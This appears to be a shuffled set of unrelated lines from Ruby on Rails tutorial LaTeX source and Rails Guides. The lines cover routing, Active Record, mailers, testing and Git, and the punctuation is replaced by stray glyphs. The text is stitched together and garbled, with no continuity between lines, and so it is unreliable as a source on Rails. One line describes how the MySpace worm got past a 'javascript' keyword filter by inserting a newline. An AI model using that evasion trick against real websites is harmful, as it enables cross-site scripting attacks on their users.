( The \ kode { Time ▖ zone ▖ now } method is a built-in Rails helper that returns the current timestamp , taking into account the time zone on the server ▖ )
This method is an alias of `Array # unshift` .
Action View is an independent package that can be used with any sort of Ruby libraries .
The ~ \ kode { id } attribute here is just an integer ( i ▖ e ▖ , \ kode { self ▖ id } , the unique ID of the user ) , so there is no danger of SQL injection in this case , but \ emph { always } escaping variables injected into SQL statements is a good habit to cultivate .
Rails keeps track of which files have been committed to the database and ╼ provides rollback features ▖
The `find _ each` method accepts most of the options allowed by the regular `find` method , except for ` : order` and ` : limit` , which are reserved for internal use by `find _ each` .
config ▖ middleware ▖ swap ActionController : : Failsafe , Lifo : : Failsafe
We &apos;re not quite done , though .
A fixture for testing user login .
Note that we &apos;ve added the argument \ kode { default : false } to \ kode { add \ _ column } in Listing ~ \ ref { code : admin _ migration } , which means that users will \ emph { not } be administrators by default .
With the \ kode { @ user } instance variable as defined in Listing ~ \ ref { code : mail _ account _ activation } , we can create the necessary links using the named edit route and embedded Ruby , as shown in Listing ~ \ ref { code : account _ activation _ view _ text } and Listing ~ \ ref { code : account _ activation _ view _ html } .
If the receiver is an array of hashes the root element is by default also &quot; objects &quot; :
The `reverse _ order` method reverses the ordering clause if specified .
in Listing ~ \ ref { code : password _ reset _ integration _ test } .
&lt; % = link _ to &quot; Blog articles &quot; , articles _ path % &gt;
$ git checkout -b my _ backport _ branch 3-2-stable
in Listing ~ \ ref { code : hello _ root _ route } .
# # # Creating Paths and URLs From Objects
As shown in the second command above , Git also lets us roll the two flags into one using \ kode { git commit -am &quot; Message &quot; } .
╼ = &gt; false
As in other aliasing methods , the new name is the first argument , and the old name is the second ( one mnemonic is that they go in the same order as if you did an assignment ) :
╼ * application-wide styles to this file and they &apos;ll appear at the top of the
In case the `reorder` clause is not used , the SQL executed would be :
cd &lt; dirname &gt;
# # # Constants
If date is the 29th of February of a leap year , you obtain the 28th :
Having added SSL , we now need to configure our application to use a webserver suitable for production applications .
# # # Masked Authenticity Tokens
Perhaps the most elementary validation is \ emph { presence } , which simply verifies that a given attribute is present .
With that , you should navigate to a user profile page and verify that you can follow and unfollow without a page refresh .
# Defaults to &apos; / assets&apos;
Article ▖ first ▖ categories ▖ many ?
( An error will appear in the Rails log , but that doesn &apos;t do any harm ▖ )
This listing includes a second use of the \ kode { render } method , which we first saw in the context of partials ( Section ~ \ ref { sec : partials } ) ; as you can see , \ kode { render } works in controller actions as well .
The return will be an array containing all of the matching records for the supplied _ primary keys _ ▖
To enforce uniqueness of email addresses ( so that we can use them as usernames ) , we &apos;ll be using the \ kode { : unique } option to the \ kode { validates } method .
&lt; / tt &gt; is true ,
Oftentimes code will start to ``smell &apos; &apos; , meaning that it gets ugly , bloated , or filled with repetition .
The solution will probably involve a Message model and a regular expression match on new microposts .
An \ kode { edit } action to activate accounts .
TIP : For more information on Active Record associations , see the &#91; Active Record ╼ Associations &#93; ( association _ basics ▖ html ) guide .
You must replace any plugins by extracting them to gems and adding them to your Gemfile ▖
# matter the context ▖
With that , our layout has links to all the static pages created in Chapter ~ \ ref { cha : static _ pages } , so that , for example , \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / about } { / about } goes to the About page ( Figure ~ \ ref { fig : about _ page } ) .
Compression also reduces file size , enabling ╼ the browser to download them faster .
( Since Factory Girl is only needed in the tests , we &apos;ve put it in the \ kode { : test } group ▖ )
The default scaffold that ╼ Rails generates , for example , adds this CSS rule :
This is the technique I recommend for killing individual processes , such as a rogue Rails server ( with the pid found via \ texttt { ps aux &#124; grep server } ) , but sometimes it &apos;s convenient to kill all the processes matching a particular process name , such as when you want to kill all the \ texttt { spring } processes gunking up your system .
If you do need a lot of static pages , take a look at the \ href { https : / / github ▖ com / thoughtbot / high _ voltage } { \ texttt { high \ _ voltage } } gem .
---Paul Graham , in \ emph { Founders at Work } by Jessica Livingston
We can verify that all this works by running the tests from Section ~ \ ref { sec : adding _ page _ titles } and see that they are still \ passing :
# gem &apos; capistrano &apos; , group : : development
( Since destroying a user should also destroy that user &apos;s relationships , we &apos;ve added \ kode { dependent : : destroy } to the association ▖ )
Gravatars are a convenient way to include user profile images without going through the trouble of managing image upload , cropping , and storage ; all we need to do is construct the proper Gravatar image URL using the user &apos;s email address and the corresponding Gravatar image will automatically appear
Because so much of what follows depends on this one method , it is difficult to develop secure passwords incrementally .
( Figure ~ \ ref { fig : signup _ failure } also shows the \ emph { web console } , which opens a Rails console in the browser to assist in debugging .
= &gt; true
It &apos;s an empty string !
The \ kode { rails } script is designed so that you don &apos;t need to use \ kode { bundle exec } .
NOTE : The values cannot be symbols ▖
Now we come to some steps that are necessary each time you create a new \ emph { repository } .
copy file
The User model with an added \ kode { remember \ _ digest } attribute .
} ╼ ╼ \ section { Account activation } % ( fold ) ╼ \ label { sec : account _ activation } ╼ ╼
The way to do this using the cloud IDE is as follows :
Git models commits as a series of patches , and in this context it makes sense to describe what each commit \ emph { does } , rather than what it did .
Rails is a large project , and a bunch of ╼ extraneous commits can add a lot of noise .
&lt; % end % &gt;
# Version of your assets , change this if you want to expire all your assets
With the code in Section ~ \ ref { sec : forgetting _ users } , our application has a complete , professional-grade authentication system .
As you &apos;ve seen , `render` tells Rails which view ( or other asset ) to use in constructing a response ▖
╼ &gt; &gt; @ user = @ user &#124; &#124; &quot; another user &quot;
# # # # Scopes for `has _ one`
&quot; comments _ count &quot; ▖ humanize # = &gt; &quot; Comments count &quot;
The fixtures in Listing ~ \ ref { code : relationships _ fixtures } first arrange for Michael to follow Lana and Mallory , and then arrange for Michael to be followed by Lana and Archer .
The initial index page for the Users resource ( \ href { http : / / localhost : 3000 / users } { / users } ) .
resource : geocoder
In this section and the next , we &apos;ll prepare for this work by constructing a Sessions controller , a login form , and the relevant controller actions .
`duplicable ? ` depends on the hard-coded list above , but it is much faster than `rescue` ▖
&lt; % = javascript _ include _ tag &quot; main &quot; , &quot; columns &quot; % &gt;
Using the \ kode { session } method , we can securely place a user id on the browser to create a temporary session .
The complete factory file , including a new factory for microposts .
&lt; html &gt;
For example , Rails creates log files to record the behavior of the application ; these files change frequently , and we don &apos;t want our version control system to have to update them constantly .
+ ------ + --------- + ------ + ------ + ------------- +
Note : Only the `optgroup` and `option` tags are returned , so you still have to wrap the output in an appropriate `select` tag .
Compare this to
To see it , you need to ╼ start a web server on your development machine ▖
has _ many : orders , - &gt; { extending FindRecentExtension }
This is a challenging section and can be skipped without loss of continuity .
It will also need to have an `attr _ accessor` set up ╼ for this field , so that the setter and getter methods are defined for it .
Next , we &apos;ll include a little JavaScript ( or , more specifically , \ href { http : / / jquery ▖ com / } { jQuery } ) to issue an alert if a user tries to upload an image that &apos;s too big ( which prevents accidental time-consuming uploads and lightens the load on the server ) :
The default \ kode { Gemfile } in the \ kode { hello \ _ app } directory .
Finds the micropost with id ~ \ kode { 1 } and \ kode { user \ _ id } equal to \ kode { user ▖ id }
No micropost feed
If this is the case , you should skip the rest of this section .
As with account activation emails ( Section ~ \ ref { sec : account _ activation _ emails } ) , we can preview password reset emails using the Rails email previewer .
# app / mailers / user _ mailer ▖ rb
( You may have to restart the webserver at this point ▖ )
has _ many : orders
1 ) # = &gt; ArgumentError
in Listing ~ \ ref { code : signup _ errors _ updated } and
If ╼ you don &apos;t , Ruby libraries and Rails will often be able to convert your native ╼ data into UTF-8 , but this doesn &apos;t always work reliably , so you &apos;re better off ╼ ensuring that all external data is UTF-8 .
( This may sometimes give an error indicating a failure to connect to the Spring server .
# # # The first form
This route would respond to paths such as ` / photos / show / 1 / with _ user / 2` ▖
has _ many : physicians , through : : appointments
We &apos;ll start with the invalid case since it is simpler ; we visit the signup path and click the button , and we expect it \ emph { not to } change the user count :
= &gt; -1
&lt; / p &gt;
&gt; I like the way you &apos;ve restructured that code in generate _ finder _ sql - much nicer ▖
File ▖ atomic _ write ( joined _ asset _ path ) do &#124; cache &#124;
= &gt; &quot; mznpybuj &quot;
Defining a \ kode { full \ _ title } helper .
( Since screencasts allow for a more incremental development approach , interested readers should consider the \ href { http : / / www ▖ railstutorial ▖ org / screencasts } { Ruby on Rails Tutorial screencasts } for a fuller understanding of this material ▖ )
where ( &quot; created _ at &lt; ? &quot; , time )
NOTE : You must have an ExecJS supported runtime in order to use CoffeeScript ▖ ╼
Then make the notification optional , so that users can opt out if desired .
The form partial for creating microposts .
Before moving on , merge your changes back into the master branch :
```css
In this first chapter , we &apos;ll get started with Ruby on Rails by installing all the necessary software and by setting up our development environment ( Section ~ \ ref { sec : up _ and _ running } ) .
# = &gt; NoMethodError : undefined method `limit &apos; for # &lt; Array : 0x007ff34d3ad6d8 &gt;
If this looks familiar , it should : it &apos;s just Capybara , which is included by default in Cucumber step files .
followers
where we could have used the equivalent
# # # The `has _ many : through` Association
&lt; % = link _ to &quot; Delete article &quot; , @ article , remote : true , method : : delete % &gt;
Code to validate the presence of micropost content .
It is designed to make programming web applications easier by making assumptions ╼ about what every developer needs to get started ▖
In the process of getting your development environment up and running , you may find that you spend a \ emph { lot } of time getting everything just right .
scope module : &apos; admin &apos; do
This is on by default in new applications .
t ▖ integer : supplier _ id
An example of the result is :
date = DateTime ▖ new ( 2010 , 6 , 7 , 19 , 55 , 25 )
We then migrate as usual :
For example , consider a medical practice where patients make appointments to see physicians ▖
In addition to resource routing , Rails has powerful support for routing arbitrary URLs to actions ▖
&lt; ul id = &quot; users &quot; &gt;
in Listing ~ \ ref { code : contact _ page _ test } .
In a book , to find all the occurrences of a given string , say ``foobar &apos; &apos; , you would have to scan each page for ``foobar &apos; &apos; .
53 ▖ ordinal # = &gt; &quot; rd &quot;
Date : Sun , 24 Aug 2014 20 : 27 : 50 GMT
X1 = : overrides _ X1 _ above
Time ▖ utc ( 1582 , 10 , 3 ) + 5 ▖ days
in Listing ~ \ ref { code : users _ migration } .
( Here I &apos;ve omitted some HTML related to the \ emph { authenticity token } , which Rails automatically includes to thwart a particular kind of attack called a \ emph { cross-site request forgery } ( CSRF ) .
Configuring the image uploader for image resizing .
Testing for a minimum password length ▖
\ href { http : / / railscasts ▖ com / } { RailsCasts } : I suggest starting by visiting the \ href { http : / / railscasts ▖ com / episodes / archive } { RailsCasts episode archive } and clicking on subjects that catch your eye .
create app / controllers / static _ pages _ controller ▖ rb
It might occur to you that we could implement the \ kode { correct \ _ user } filter using the \ kode { Micropost } model directly , like this :
If the resulting lines are too wide , say 200 columns or more , put the comment above the call :
NOTE : If you specify an encoding , Mail will assume that your content is already ╼ encoded and not try to Base64 encode it .
Author ▖ joins ( : articles ) ▖ where ( articles : { author : author } )
&gt; &gt; Rails ▖ env ▖ development ?
We protected against data loss while enabling collaboration by placing our application source code under version control with Git and pushing the resulting code to a private repository at Bitbucket .
before and after the execution of
password : company ▖ smtp _ password ,
( As we &apos;ll see in Section ~ \ ref { sec : a _ controller _ class } , the console also has access to the Rails environment ▖ )
To copy these migrations into the ╼ application use this command :
# # # # Range Conditions
A test for the user profile ▖
The JavaScript embedded Ruby to create a following relationship .
As noted in Chapter ~ \ ref { cha : a _ toy _ app } , the main reason for this is that the default Rails page typically breaks at Heroku , which makes it hard to tell if the deployment was successful or not .
This partial introduces several new Rails and Ruby constructs , including two methods for Rails error objects .
class Foo
The great ╼ news is that these things are entirely possible , because a Rails engine shares ╼ much the same functionality as a Rails application ▖
&apos;some class method string&apos;
Each element in the cookie is itself a hash of two elements , a \ kode { value } and an optional \ kode { expires } date .
user _ path ( @ user ) # = &gt; &quot; / users / 357-john-smith &quot;
create _ table : articles do &#124; t &#124;
A model for user followers through passive relationships .
Code for an example user .
A test of \ kode { authenticated ? }
is the submitted password .
The `collection _ singular _ ids = ` method makes the collection contain only the objects identified by the supplied primary key values , by adding and deleting as appropriate .
We &apos;ll see another example in Section ~ \ ref { sec : a _ users _ resource } .
Rails 4 now uses `PATCH` as the primary HTTP verb for updates when a RESTful ╼ resource is declared in `config / routes ▖ rb` ▖
SELECT DISTINCT name FROM clients
Now that the user index is complete , there &apos;s only one canonical REST action left : \ kode { destroy } .
If you do not specify an alt text explicitly , it defaults to the file name of the file , capitalized and with no extension ▖
It works like `Enumerator # each _ with _ object` with sending `deep _ dup` method to each pair inside .
From Table ~ \ ref { table : RESTful _ users } , we see that the proper requests are \ texttt { GET } and \ texttt { PATCH } , respectively , which means using the \ kode { get } and \ kode { patch } methods inside the tests .
class Document &lt; ActiveRecord : : Base
# Tell the UserMailer to send a welcome email after save
We &apos;ll test for the correct behavior of updating users by writing a test similar to the one shown in Listing ~ \ ref { code : unsuccessful _ edit _ test } , only this time we &apos;ll submit valid information .
This tells the `form _ for` ╼ helper what this form is for ▖
One way to do this is to use Ruby &apos;s \ kode { map } method , available on any ``enumerable &apos; &apos; object , i ▖ e ▖ , any object ( such as an Array or a Hash ) that consists of a collection of elements
# = &gt; &lt; link href = &quot; / assets / all ▖ css &quot; media = &quot; screen &quot; rel = &quot; stylesheet &quot; / &gt;
Here \ kode { Word &lt; String } is the Ruby syntax for inheritance ( discussed briefly in Section ~ \ ref { sec : static _ pages } ) , which ensures that , in addition to the new \ kode { palindrome ? } \ method , words also have all the same methods as strings :
There may be times when you wish to customize the query used by `has _ and _ belongs _ to _ many` ▖
As in Section ~ \ ref { sec : account _ activations _ resource } , we &apos;ve included a flag to skip generating tests and will instead build on the integration test from Section ~ \ ref { sec : activation _ test _ and _ refactoring } .
The user index page \ href { http : / / localhost : 3000 / users } { / users } with pagination ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ index _ pagination _ rails _ 3 _ bootstrap-full ▖ png } { ( full size ) }
╼ ╼ ╼ \ subsection { Constructors } % ( fold ) ╼ \ label { sec : constructors } ╼ ╼
\ href { http : / / en ▖ wikipedia ▖ org / wiki / Hypertext _ Transfer _ Protocol } { HTTP } is a \ href { https : / / en ▖ wikipedia ▖ org / wiki / Stateless _ protocol } { \ emph { stateless protocol } } , treating each request as an independent transaction that is unable to use information from any previous requests .
Specifying the ╼ controller with Ruby constant notation ( eg ▖ `controller : &apos; Admin : : UserPermissions &apos; ` ) ╼ can lead to routing problems and results in ╼ a warning .
&apos;X-Frame-Options &apos; = &gt; &apos; SAMEORIGIN &apos; ,
The default Rails page served by \ kode { rails server } .
You can also use the ternary operator to replace assignment , so that
* Implement a `receive` method in your mailer .
Although some particularly tricky steps are explicitly highlighted in the text , it is impossible to anticipate all the things that can go wrong .
* `lock`
Alice accidentally clicks on ``Submit &apos; &apos; \ emph { twice } , sending two requests in quick succession .
layout &quot; inventory &quot;
* `append _ asset _ paths` Finds asset paths for the application and all attached railties and keeps a track of the available directories in `config ▖ static _ asset _ paths` .
Like \ kode { create } , \ kode { destroy } returns the object in question , though I can &apos;t recall ever having used the return value of \ kode { destroy } .
Much of the work involved in signin comes from building this cookie-based authentication machinery .
Active Record provides a finder method called `joins` for specifying `JOIN` clauses on the resulting SQL ▖ There are multiple ways to use the `joins` method .
def arel _ table # : nodoc :
* `has _ and _ belongs _ to _ many`
@ @ session _ store = store ▖ is _ a ? (
You &apos;ve heard that Rails promotes &quot; convention over configuration &quot; ▖
config ▖ assets ▖ enabled = true
What this means in the context of users---which we &apos;re now thinking of as a Users \ emph { resource } ---is that we should view the user with id ~ \ kode { 1 } by issuing a \ texttt { GET } request to the URL / users / 1 .
= &gt; &quot; Michael Hartl &lt; mhartl @ example ▖ com &gt; &quot;
It is recommended not to disable this option unless strongly required , since this works as a security measure against setting any invalid locale from user input .
Note that RailsCasts usually omit the tests , which is probably necessary to keep the episodes nice and short , but you could get the wrong idea about the importance of testing .
class Blorgh : : Article &lt; ActiveRecord : : Base
One way to check the headers are cached properly in your CDN is by using &#91; curl &#93; ( ╼ http : / / explainshell ▖ com / explain ? cmd = curl + -I + http % 3A % 2F % 2Fwww ▖ example ▖ com ) ▖
╼ $ rails generate model Foo bar : string baz : integer
remove nonempty directory
It has a ` : remote` option that you can call like this :
Use `bundle show &#91; gemname &#93; ` to see where a bundled gem is installed .
\ subsection { Backtrace silencer } % ( fold ) ╼ %
# # # # sanitize
( \ emph { Note } : The present volume is the Rails ~ 4 ▖ 0 \ emph { version } of the book , which means that it has been revised to be compatible with Rails ~ 4 ▖ 0 , but it is not yet a new \ emph { edition } because the changes in Rails don &apos;t yet justify it .
This is just a synonym for \ kode { it } , and can be used when writing \ kode { it } would sound unnatural .
&apos;X-Frame-Options &apos; = &gt; &apos; DENY&apos;
The method `transform _ keys` accepts a block and returns a hash that has applied the block operations to each of the keys in the receiver :
concern : commentable do
The view for the Home page with full HTML structure ▖
`app / assets / javascripts / blorgh / articles ▖ js` and
Write in present tense : &quot; Returns a hash that ▖ ▖ ▖ &quot; , rather than &quot; Returned a hash that ▖ ▖ ▖ &quot; or &quot; Will return a hash that ▖ ▖ ▖ &quot; .
This is covered in more detail in &#91; Configuring Rails Applications &#93; ( configuring ▖ html ) .
These commands tell Git that you want to add GitHub as the origin for your main ( \ emph { master } ) branch and then push your repository up to GitHub .
This validation creates a virtual attribute whose name is the ╼ name of the field that has to be confirmed with &quot; _ confirmation &quot; appended .
&quot; : : Inflections &quot; ▖ demodulize # = &gt; &quot; Inflections &quot;
Here , you don &apos;t get groups of routes automatically generated by resourceful routing ▖
* `action _ dispatch ▖ configure` Configures the `ActionDispatch : : Http : : URL ▖ tld _ length` to be set to the value of `config ▖ action _ dispatch ▖ tld _ length` .
Call the \ kode { remember } method to remember the given user .
One common scenario is wanting to undo code generation---for example , when you change your mind on the name of a controller and want to eliminate the generated files .
In the days before powerful web frameworks with full testing capabilities , testing was often painful and error-prone .
The code in Listing ~ \ ref { code : email _ downcase } passes a block to the \ kode { before \ _ save } callback and sets the user &apos;s email address to a lower-case version of its current value using the \ kode { downcase } string method .
# # # # # `collection ▖ build ( attributes = { } , ▖ ▖ ▖ )
resources : videos
`rails server` does the basic job of creating a `Rack : : Server` object and starting the webserver .
( That refinement is preventing unactivated users from being displayed , which is left as an exercise ( Section ~ \ ref { sec : activation _ resets _ exercises } ) ▖ )
You can add error messages that are related to the object &apos;s state as a whole , instead of being related to a specific attribute ▖
beginning
We &apos;ll take a quick detour in Chapter ~ \ ref { cha : rails _ flavored _ ruby } to learn a little about the Ruby language underlying Rails .
To use the feed in the sample application , we add an \ kode { @ feed \ _ items } instance variable for the current user &apos;s ( paginated ) feed , as in Listing ~ \ ref { code : feed _ instance _ variable } , and then add a status feed partial ( Listing ~ \ ref { code : feed _ partial } ) to the Home page ( Listing ~ \ ref { code : home _ with _ feed } ) .
As is usually the case with Rails helpers , we don &apos;t need to know any details about the implementation , but what we \ emph { do } need to know is what the \ kode { f } object does : when called with a method corresponding to an \ href { http : / / www ▖ w3schools ▖ com / html / html _ forms ▖ asp } { HTML form element } ---such as a text field , radio button , or password field---it returns code for that element specifically designed to set an attribute of the \ kode { @ user } object .
If you don &apos;t specify an extension , ` ▖ css` will be appended automatically .
&quot; # { module _ name } Helper &quot;
( In what follows , I &apos;ll sometimes suppress the \ kode { = &gt; nil } part for simplicity ▖ )
# The following optional lines are part of the advanced setup .
The password reset plain-text email template .
The email index represents an update to our data modeling requirements , which ( as discussed in Section ~ \ ref { sec : database _ migrations } ) is handled in Rails using migrations .
Extensions to `Time`
If no adapter is set , the job is immediately executed .
we get :
In addition , when ╼ generating a scaffold , Rails will put some ERB into the ` _ form ▖ html ▖ erb` that ╼ it generates that displays the full list of errors on that model .
# # # # Rendering XML
# config / application ▖ rb
This does not destroy the objects .
Code to implement friendly forwarding .
if some _ complex _ condition _ involving _ ivars _ and _ private _ methods ?
&lt; html &gt;
Note : with the Asset Pipeline the : cache and : concat options aren &apos;t used ╼ anymore , delete these options from the `javascript _ include _ tag` and ╼ `stylesheet _ link _ tag` .
In the \ kode { setup } step , we create a new micropost while associating it with a valid user from the fixtures , and then check that the result is valid .
You can also create methods that verify the state of your models and add ╼ messages to the `errors` collection when they are invalid ▖
To avoid this call , you can add a counter cache to the _ belonging _ model :
class CreateCustomers &lt; ActiveRecord : : Migration
The core of the micropost data model is even simpler than the one for users : a micropost has only an \ kode { id } and a \ kode { content } field for the micropost &apos;s text ( of type \ kode { text } )
It only has effect if `config ▖ cache _ classes` is true , which it is by default in production mode ▖ ╼ ╼
in Listing ~ \ ref { code : rails _ command } .
&lt; % = form _ for : article do &#124; f &#124; % &gt;
* Call `render` to create a full response to send back to the browser
The `collection ▖ size` method returns the number of objects in the collection .
As a rule of thumb , `tableize` returns the table name that corresponds to a given model for simple cases ▖
If you view your app running in production , it won &apos;t work without a production database , which we can create by running \ texttt { rake db : migrate } in production :
The default error messages depend on the type of length validation being ╼ performed ▖
For these last two steps to work , we need to have enough users in the test database to invoke pagination , i ▖ e ▖ , more than 30 .
The rest of this section is dedicated to understanding it .
If your test helper contains a call to ╼ `ActiveRecord : : Migration ▖ check _ pending ! ` this can be removed ▖
We added a controller action and modified the root route to create a ``hello , world &apos; &apos; application .
Now that our users index page is working , we &apos;ll write a lightweight test for it , including a minimal test for the pagination from Section ~ \ ref { sec : pagination } .
Rails would dispatch that request to the `destroy` method on the `photos` controller with ` { id : &apos; 17 &apos; } ` in `params` .
Tests for the Relationships controller responses to Ajax requests .
This method works with polymorphic relationships as well .
It is equivalent to writing :
has _ many : comments
A mockup of the users index with delete links .
At this point , you can use a rake command to run the migration :
&#124; &#124; 412 &#124; : precondition _ failed &#124;
render &quot; products / show &quot;
The method is to add a User \ emph { mailer } using the Action Mailer library , which we &apos;ll use in the Users controller \ kode { create } action to send an email with an activation link .
&lt; % = f ▖ label : body , &apos; Body &apos; % &gt; :
With the code from Section ~ \ ref { sec : users _ controller } , we already have a working page for new users at / users / new , but recall from Table ~ \ ref { table : url _ mapping } that we want the URL to be / signup instead .
# # # Custom Methods
You rarely have to write this code yourself ▖
Of course , on a real site you probably wouldn &apos;t want to seed it with sample data , but I include it here for purposes of illustration ( Figure ~ \ ref { fig : heroku _ sample _ users } ) .
The user profile with unstyled microposts .
Applications created before Rails 4 ▖ 1 uses `Marshal` to serialize cookie values into ╼ the signed and encrypted cookie jars ▖
i = Item ▖ lock ▖ first
To define this configuration setting , you should use a `mattr _ accessor` inside ╼ the `Blorgh` module for the engine ▖
# = &gt; &lt; option &gt; VISA &lt; / option &gt; &lt; option &gt; MasterCard &lt; / option &gt;
If you know someone else who uses Rails , try asking them if they &apos;ll check out ╼ your work ▖
As in the case of creating users ( signup ) , the first step in creating sessions ( signin ) is to handle \ emph { invalid } input .
Also , to keep it simple , the articles form will have a new text field called ╼ `author _ name` , where users can elect to put their name ▖
( This is yet another reason to follow the Git setup steps in Section ~ \ ref { sec : version _ control } if you haven &apos;t already ▖ )
{ a : 1 } ▖ with _ indifferent _ access &#91; &quot; a &quot; &#93; # = &gt; 1
in Listing ~ \ ref { code : account _ activation _ and _ password _ resets } .
Or on a relation :
config ▖ assets ▖ compile = false
For example , in Section ~ \ ref { sec : rails _ server } we &apos;ll run a local development web server with the \ kode { rails server } command :
* You must change the following application configuration setting :
strip _ links ( &apos; Blog : &lt; a href = &quot; http : / / myblog ▖ com / &quot; &gt; Visit &lt; / a &gt; ▖ &apos; )
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa &quot;
Note that the \ kode { destroy } method in Listing ~ \ ref { code : microposts _ destroy _ action } redirects to the URL
To avoid this complexity , the \ emph { Ruby on Rails Tutorial } standardizes on the excellent cloud development environment \ href { http : / / c9 ▖ io / } { Cloud9 } .
You are not limited to the seven routes that RESTful routing creates by default ▖
See Section ~ \ ref { sec : backtrace _ silencer } for information on how to filter this backtrace to eliminate unwanted lines .
The user profile page with code for microposts---but no microposts .
It might even make more sense to use an \ kode { update } action , but the activation link needs to be sent in an email and hence should involve a regular browser click , which issues a \ texttt { GET } request instead of the \ texttt { PATCH } request required by the \ kode { update } action .
Adapting the Relationships controller to respond to Ajax involves adding \ kode { respond \ _ to } as above to the \ kode { create } and \ kode { destroy } actions from Listing ~ \ ref { code : relationships _ controller _ following } .
We can enforce secure operations by always creating and destroying dependent objects through their association .
As a rule of thumb , except perhaps for concatenation as explained above , any method that may change a string gives you an unsafe string ▖
Preventing unactivated users from logging in .
A test for \ kode { name } length validation ▖
c1 ▖ first _ name = &quot; Michael &quot;
Let &apos;s take a look at what Rails does by default when creating a new resource using the scaffold generator :
The next problem was MySpace filtering the word &quot; javascript &quot; , so the author used &quot; java &amp; lt ; NEWLINE &amp; gt ; script &quot; to get around this :
Rails 4 ▖ 1 fixed these issues by isolating its own encoder from the JSON gem ▖
If you observe any strange behavior in a `has _ and _ belongs _ to _ many` association like mangled models IDs , or exceptions about conflicting IDs , chances are you forgot that bit .
The final piece of the relationships puzzle is to add a \ kode { user ▖ followers } method to go with \ kode { user ▖ following } .
&lt; td &gt; &lt; % = a % &gt; &lt; / td &gt;
The StaticPages controller with added \ kode { about } action .
Short summary ( ideally 50 characters or less )
# # # # The `assert _ routing` Assertion
# --seed 1234
Since we &apos;ve now added several custom named routes , it &apos;s useful to look at the complete list of the routes for our application , which we can generate using \ kode { rake routes } :
# You have access to the mail instance ,
If you would like to run migrations only from one engine , you can do it by ╼ specifying `SCOPE` :
In the present case , though , saying ``1 microposts &apos; &apos; is ungrammatical , so we arrange to display ``1 micropost &apos; &apos; and ``2 microposts &apos; &apos; using the \ kode { pluralize } method we saw in Section ~ \ ref { sec : signup _ error _ messages } .
This is an optimization for speed , as creating 30 users can be slow on some systems .
in Listing ~ \ ref { code : sessions _ helper _ include } .
As with the other authentication elements , we &apos;ll put \ kode { sign \ _ out } in the Sessions helper module .
This is an appropriate use of `via : : all` , as you will want to allow your Rack application to handle all verbs as it considers appropriate .
Once you &apos;ve verified that the Heroku command-line interface is installed , use the \ kode { heroku } command to log in and add your SSH key :
This can be triggered by explicitly defined named routes or by the `resources` method ▖
&#91; Active Record was described by Martin Fowler &#93; ( http : / / www ▖ martinfowler ▖ com / eaaCatalog / activeRecord ▖ html ) ╼ in his book _ Patterns of Enterprise Application Architecture _ ▖
The \ href { http : / / railscasts ▖ com / episodes / 37-simple-search-form } { RailsCast on simple search forms } will help get you started .
Sometimes , you want to add a little Ajax to those elements , ╼ and Rails has got your back in those cases .
The rest of this tutorial is dedicated to building on the strengths and eliminating the weaknesses .
Seriously : \ href { http : / / railscasts ▖ com / } { \ emph { RailsCasts } } .
Extensions to `Hash`
A custom Help page .
&lt; / form &gt;
Finally , in Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } we &apos;ll add account activation ( thereby confirming a valid email address ) and password resets .
To apply a `GROUP BY` clause to the SQL fired by the finder , you can specify the `group` method on the find .
render &quot; edit &quot;
If , on the other ╼ hand , you &apos;d like to update several records in bulk , you may find the ╼ `update _ all` class method useful :
To avoid code repetition , you should also remove \ kode { signed \ _ in \ _ user } from the Users controller at this time .
We did this by relying on the test code provided by the tutorial and addressing each error message until the test suite was passing .
With addition in Listing ~ \ ref { code : logged _ in _ p } , we &apos;re now ready to change the layout links if a user is logged in .
Listing ~ \ ref { code : password _ migration } uses the \ kode { add \ _ column } method to add a \ kode { password \ _ digest } column to the \ kode { users } table .
╼ ╼ \ subsection { A hashed password } % ( fold ) ╼ \ label { sec : a _ hashed _ password } ╼ ╼
On Windows , the analogous directory would be
c ▖ first _ name = = o ▖ customer ▖ first _ name # = &gt; false
Ensuring email uniqueness by downcasing the email attribute ▖
The result of calling \ kode { new } on a class is an object of that class , also called an \ emph { instance } of the class .
# # # `validates _ with`
date :
after _ action : set _ delivery _ options ,
While convenient for the programmer , this is inefficient in production .
As shown in Listing ~ \ ref { code : sendgrid _ config } , you will also have to define a \ kode { host } variable with the address of your production website .
The site layout with partials for the stylesheets and header .
Item Update ( 0 ▖ 4ms ) UPDATE `items` SET `updated _ at` = &apos; 2009-02-07 18 : 05 : 56 &apos; , `name` = &apos; Jones &apos; WHERE `id` = 1
See the chapter \ href { http : / / git-scm ▖ com / book / en / git-branching } { Git Branching in \ emph { Pro Git } } for details .
s = &quot; &quot; ▖ html _ safe
If ╼ you want to inspect , alter or do anything else with the `Mail : : Message` object you can ╼ access it with the `message` method on the `ActionMailer : : MessageDelivery` object .
Normally , websites run on port 80 , but this usually requires special privileges , so it &apos;s conventional to use a less restricted higher-numbered port for the development server .
SELECT &quot; articles &quot; .
# = &gt; Sat , 01 Aug 2010 00 : 00 : 00 UTC + 00 : 00 ▖ .
Ruby and Rails books : I recommend \ href { http : / / www ▖ amazon ▖ com / gp / product / 1430223634 } { \ emph { Beginning Ruby } } by Peter Cooper , \ href { http : / / www ▖ amazon ▖ com / gp / product / 1933988657 } { \ emph { The Well-Grounded Rubyist } } by David ~ A ▖ Black , \ href { http : / / www ▖ amazon ▖ com / Eloquent-Ruby-Addison-Wesley-Professional-Series / dp / 0321584104 / } { \ emph { Eloquent Ruby } } by Russ Olsen , and \ href { http : / / www ▖ amazon ▖ com / gp / product / 0672328844 } { \ emph { The Ruby Way } } by Hal Fulton for further Ruby learning , and \ href { http : / / www ▖ amazon ▖ com / gp / product / 0321601661 } { \ emph { The Rails ~ 3 Way } } by Obie Fernandez and \ emph { Rails ~ 3 in Action } ( wait for the second edition ) by Ryan Bigg and Yehuda Katz for more about Rails .
The resulting augmented data model for microposts appears in Figure ~ \ ref { fig : micropost _ model _ picture } .
def calculate _ shipping _ charges ( order )
Using Rails &apos; default pluralization convention , the set of all users following a given user is that user &apos;s \ emph { followers } , and \ kode { hobbes ▖ followers } is an array of those users .
Some Rails shortcuts .
Due to this , our ╼ `CommentsController` is there to provide a method to create comments and delete ╼ spam comments when they arrive .
Destroying a user .
Existence of Objects
Let &apos;s drop into the console to see the effects of adding a validation to our User model
Neither the tests nor the validation will be exhaustive , just good enough to accept most valid email addresses and reject most invalid ones .
